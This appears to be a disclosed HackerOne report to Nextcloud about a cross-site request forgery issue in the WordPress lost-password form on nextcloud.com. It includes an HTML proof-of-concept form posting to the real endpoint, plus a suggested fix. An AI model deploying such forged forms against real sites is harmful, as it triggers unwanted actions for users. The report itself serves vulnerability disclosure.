@@ -1,0 +1,41 @@
+ReportLink:https://hackerone.com/reports/145583
+WeaknessName:Cross-Site Request Forgery (CSRF)
+Reporter:https://hackerone.com/mefkan
+ReportedTo:Nextcloud(nextcloud)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:19.06.2016 9:56:51
+
+Summary:
+
+Hi,
+
+I think it is something about your Wordpress version.It's not something highy risky bu it is vulnerability.
+
+CODE:
+
+<form name="lostpasswordform" id="lostpasswordform" action="https://nextcloud.com/wp-login.php?action=lostpassword" method="post" style="position: static; left: 0px;">
+	<p>
+		<label for="user_login">Username or Email<br>
+		<input type="text" name="user_login" id="user_login" class="input" value="" size="20"></label>
+	</p>
+		<input type="hidden" name="redirect_to" value="">
+	<p class="submit"><input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Get New Password"></p>
+</form>
+
+
+
+For testing CSRF  I added the .html file to attachments.And there is a screenshot for you.
+
+
+How To Fix :
+
+Adding rp_key will be fine.
+
+Please take a look at links below
+
+https://wpvulndb.com/vulnerabilities/7691
+https://core.trac.wordpress.org/changeset/30418
+
+Best Regards,
